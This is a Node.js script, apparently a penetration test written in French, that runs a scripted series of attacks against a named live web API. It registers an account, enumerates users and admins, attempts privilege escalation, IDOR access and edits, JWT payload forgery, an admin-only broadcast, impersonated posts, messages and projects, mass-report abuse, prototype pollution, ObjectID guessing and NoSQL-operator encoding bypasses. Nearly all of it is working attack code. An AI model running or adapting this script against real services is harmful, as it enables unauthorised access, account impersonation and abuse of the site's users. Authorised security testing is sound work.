const https = require('https');
const API = 'siteweb-back-lpp-v1.onrender.com';
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

function req(m, p, b, auth) {
  return new Promise(r => {
    const h = { 'User-Agent': UA, 'Content-Type': 'application/json' };
    if (auth) h['Authorization'] = 'Bearer ' + auth;
    const body = b ? JSON.stringify(b) : null;
    if (body) h['Content-Length'] = Buffer.byteLength(body);
    const q = https.request({ hostname: API, path: p, method: m, headers: h }, res => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => { try { r({ s: res.statusCode, d: JSON.parse(d) }); } catch { r({ s: res.statusCode, d }); } });
    });
    q.on('error', e => r({ s: 0, d: e.message }));
    if (body) q.write(body);
    q.end();
  });
}

const delay = ms => new Promise(ok => setTimeout(ok, ms));

(async () => {
  // ============================
  // PHASE 2: Creation compte
  // ============================
  console.log('=== PHASE 2: CREATION COMPTE ===');
  const inscription = await req('POST', '/api/auth/inscription', {
    prenom: 'Marie', nom: 'Dupont',
    email: 'marie.dupont.pentest3@gmail.com',
    motDePasse: 'MonMotDePasse123!',
    confirmationMotDePasse: 'MonMotDePasse123!',
    cguAcceptees: true
  });
  console.log('Inscription:', inscription.s);

  const token = inscription.d?.data?.token;
  const userId = inscription.d?.data?.utilisateur?.id;
  if (!token) { console.log('ECHEC:', JSON.stringify(inscription.d).substring(0, 300)); return; }

  console.log('Token: OUI, User ID:', userId);
  console.log('Role:', inscription.d.data.utilisateur.role);
  console.log('Permissions:', JSON.stringify(inscription.d.data.utilisateur.permissions));

  await delay(500);

  // ============================
  // EXPLORATION PROFIL
  // ============================
  console.log('\n=== MON PROFIL ===');
  const moi = await req('GET', '/api/auth/moi', null, token);
  console.log('Status:', moi.s, '- Champs:', Object.keys(moi.d?.data || {}).join(', '));

  await delay(500);

  // ============================
  // ENUMERATION USERS
  // ============================
  console.log('\n=== ENUMERATION USERS ===');
  const users = await req('GET', '/api/utilisateurs', null, token);
  const allUsers = users.d?.data?.utilisateurs || users.d?.data || [];
  console.log('Status:', users.s, '- Count:', Array.isArray(allUsers) ? allUsers.length : 'N/A');
  if (Array.isArray(allUsers) && allUsers.length > 0) {
    console.log('Exemple user:', JSON.stringify(allUsers[0]).substring(0, 200));
    // Chercher un admin/modo
    const admins = allUsers.filter(u => u.role === 'admin_modo' || u.role === 'super_admin');
    console.log('Admins trouves:', admins.length);
    admins.forEach(a => console.log('  Admin:', a._id, a.prenom, a.nom, a.role));
  }

  await delay(500);

  // ============================
  // PROJETS
  // ============================
  console.log('\n=== PROJETS ===');
  const projets = await req('GET', '/api/projets', null, token);
  const projetsList = projets.d?.data?.projets || [];
  console.log('Status:', projets.s, '- Count:', projetsList.length);

  await delay(500);

  // ============================
  // PHASE 3: ESCALADE DE PRIVILEGES
  // ============================
  console.log('\n=== PHASE 3: ESCALADE PRIVILEGES ===');

  // 3.1 Tenter de modifier mon propre role
  console.log('\n[3.1] Modification role via PATCH profil');
  const hackRole = await req('PUT', '/api/profil', { role: 'super_admin' }, token);
  console.log('PUT /profil {role:super_admin}:', hackRole.s, JSON.stringify(hackRole.d).substring(0, 200));

  await delay(500);

  // 3.2 Tenter de modifier mon role via un autre endpoint
  console.log('\n[3.2] Modification role via PATCH utilisateur');
  const hackRole2 = await req('PATCH', '/api/utilisateurs/' + userId, { role: 'super_admin' }, token);
  console.log('PATCH /utilisateurs/me {role:super_admin}:', hackRole2.s, JSON.stringify(hackRole2.d).substring(0, 200));

  await delay(500);

  // 3.3 IDOR - acceder au profil d'un autre user
  console.log('\n[3.3] IDOR - Profil autre user');
  const otherUser = Array.isArray(allUsers) ? allUsers.find(u => u._id !== userId) : null;
  if (otherUser) {
    const idor = await req('GET', '/api/utilisateurs/' + otherUser._id, null, token);
    console.log('GET /utilisateurs/' + otherUser._id + ':', idor.s);
    // Voir si on a acces a des champs sensibles
    const data = idor.d?.data;
    if (data) {
      console.log('Champs exposes:', Object.keys(data).join(', '));
      console.log('Email expose?', data.email ? 'OUI: ' + data.email : 'NON');
      console.log('Role expose?', data.role ? 'OUI: ' + data.role : 'NON');
    }
  }

  await delay(500);

  // 3.4 Tenter de modifier le profil d'un autre user
  console.log('\n[3.4] Modifier profil autre user');
  if (otherUser) {
    const modOther = await req('PUT', '/api/profil', { bio: 'HACKED' }, token);
    console.log('PUT /profil (mon profil):', modOther.s);

    // Tenter directement sur l'autre user
    const modOther2 = await req('PATCH', '/api/utilisateurs/' + otherUser._id, { bio: 'HACKED' }, token);
    console.log('PATCH /utilisateurs/' + otherUser._id + ':', modOther2.s, JSON.stringify(modOther2.d).substring(0, 150));
  }

  await delay(500);

  // 3.5 Acceder a des routes admin avec mon token user
  console.log('\n[3.5] Acces routes admin avec token user');
  const adminDash = await req('GET', '/api/admin/dashboard', null, token);
  console.log('GET /admin/dashboard:', adminDash.s, JSON.stringify(adminDash.d).substring(0, 150));

  await delay(500);

  const adminUsers = await req('GET', '/api/admin/users', null, token);
  console.log('GET /admin/users:', adminUsers.s, JSON.stringify(adminUsers.d).substring(0, 150));

  await delay(500);

  // 3.6 Tenter d'envoyer une notification broadcast (action admin)
  console.log('\n[3.6] Broadcast notification (admin only)');
  const broadcast = await req('POST', '/api/admin/notifications/broadcast', {
    titre: 'Test', message: 'Hacked', type: 'info'
  }, token);
  console.log('POST /admin/notifications/broadcast:', broadcast.s, JSON.stringify(broadcast.d).substring(0, 150));

  await delay(500);

  // 3.7 Manipuler le JWT - ajouter des permissions
  console.log('\n[3.7] JWT manipulation');
  const parts = token.split('.');
  const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
  console.log('JWT payload:', JSON.stringify(payload));
  // Modifier le payload
  payload.role = 'super_admin';
  payload.permissions = ['*'];
  const fakePayload = Buffer.from(JSON.stringify(payload)).toString('base64url');
  const fakeToken = parts[0] + '.' + fakePayload + '.' + parts[2];
  const jwtHack = await req('GET', '/api/admin/dashboard', null, fakeToken);
  console.log('Fake JWT admin dashboard:', jwtHack.s);

  await delay(500);

  // ============================
  // PHASE 4: LOGIQUE METIER
  // ============================
  console.log('\n=== PHASE 4: LOGIQUE METIER ===');

  // 4.1 Publier du contenu en tant qu'un autre user
  console.log('\n[4.1] Publication en tant quautre user');
  const fakePost = await req('POST', '/api/publications', {
    contenu: 'Test publication normale',
    auteur: otherUser?._id  // tenter d'usurper l'auteur
  }, token);
  console.log('POST /publications {auteur:other}:', fakePost.s);

  await delay(500);

  // 4.2 Envoyer un message a quelquun en usurpant l'expediteur
  console.log('\n[4.2] Message avec expediteur usurpe');
  if (otherUser) {
    const fakeMsg = await req('POST', '/api/messagerie/envoyer', {
      destinataire: userId,
      contenu: 'Test message',
      expediteur: otherUser._id  // usurper
    }, token);
    console.log('Message usurpe:', fakeMsg.s, JSON.stringify(fakeMsg.d).substring(0, 150));
  }

  await delay(500);

  // 4.3 Mass report - signaler tous les users (abus)
  console.log('\n[4.3] Signalement en masse');
  if (otherUser) {
    const report = await req('POST', '/api/reports', {
      cible: otherUser._id,
      typeCible: 'utilisateur',
      raison: 'spam',
      description: 'Test report'
    }, token);
    console.log('Report:', report.s, JSON.stringify(report.d).substring(0, 150));
  }

  await delay(500);

  // 4.4 Creer un projet et tenter d'y mettre le porteur comme quelqu'un d'autre
  console.log('\n[4.4] Projet avec porteur usurpe');
  const fakeProjet = await req('POST', '/api/projets/entrepreneur', {
    nom: 'Projet Test Pentest',
    description: 'Description test',
    pitch: 'Pitch test pour le pentest',
    categorie: 'tech',
    secteur: 'informatique',
    maturite: 'idee',
    porteur: otherUser?._id  // usurper le porteur
  }, token);
  console.log('Projet usurpe:', fakeProjet.s, JSON.stringify(fakeProjet.d).substring(0, 200));

  await delay(500);

  // 4.5 Prototype pollution via __proto__
  console.log('\n[4.5] Prototype pollution');
  const proto = await req('POST', '/api/auth/connexion', {
    email: 'test@test.com',
    motDePasse: 'test',
    '__proto__': { 'role': 'super_admin', 'isAdmin': true },
    'constructor': { 'prototype': { 'role': 'super_admin' } }
  });
  console.log('Proto pollution login:', proto.s);

  await delay(500);

  // 4.6 Mass enumeration - deviner des ObjectIDs
  console.log('\n[4.6] ObjectID enumeration');
  if (userId) {
    // Les ObjectIDs MongoDB sont sequentiels - tenter +1, -1
    const hexId = userId;
    const num = parseInt(hexId.slice(-6), 16);
    const nextId = hexId.slice(0, -6) + (num + 1).toString(16).padStart(6, '0');
    const prevId = hexId.slice(0, -6) + (num - 1).toString(16).padStart(6, '0');

    const next = await req('GET', '/api/utilisateurs/' + nextId, null, token);
    console.log('User ID+1:', next.s);
    await delay(300);
    const prev = await req('GET', '/api/utilisateurs/' + prevId, null, token);
    console.log('User ID-1:', prev.s);
  }

  await delay(500);

  // ============================
  // PHASE 5: EVASION AVANCEE
  // ============================
  console.log('\n=== PHASE 5: EVASION AVANCEE ===');

  // 5.1 Unicode encoding pour bypass des filtres
  console.log('\n[5.1] Unicode bypass');
  const unicode = await req('GET', '/api/projets?categorie=%24%67%74', null, token);
  console.log('URL-encoded $gt:', unicode.s);

  await delay(500);

  // 5.2 Double encoding
  const doubleEnc = await req('GET', '/api/projets?categorie=%2524gt', null, token);
  console.log('Double-encoded $gt:', doubleEnc.s);

  await delay(500);

  // 5.3 Parameter pollution - meme param plusieurs fois
  console.log('\n[5.3] HTTP Parameter Pollution');
  const hpp = await req('GET', '/api/projets?categorie=tech&categorie=energie', null, token);
  console.log('HPP categorie:', hpp.s);

  await delay(500);

  // 5.4 JSON injection dans les strings
  console.log('\n[5.4] JSON injection');
  const jsonInj = await req('PUT', '/api/profil', {
    bio: '{"role":"super_admin","$set":{"role":"super_admin"}}'
  }, token);
  console.log('JSON injection bio:', jsonInj.s, JSON.stringify(jsonInj.d).substring(0, 150));

  await delay(500);

  // 5.5 Verifier si le role a change apres toutes les tentatives
  console.log('\n=== VERIFICATION FINALE ===');
  const finalCheck = await req('GET', '/api/auth/moi', null, token);
  console.log('Mon role final:', finalCheck.d?.data?.role);
  console.log('Mes permissions:', JSON.stringify(finalCheck.d?.data?.permissions));
  console.log('Suis-je toujours user?', finalCheck.d?.data?.role === 'user' ? 'OUI (bien protege)' : 'NON (COMPROMIS!)');

  // 5.6 Verifier si je suis banni
  await delay(300);
  const banCheck = await req('GET', '/api/projets', null, token);
  console.log('Suis-je banni?', banCheck.s === 403 ? 'OUI' : 'NON (status ' + banCheck.s + ')');
})();
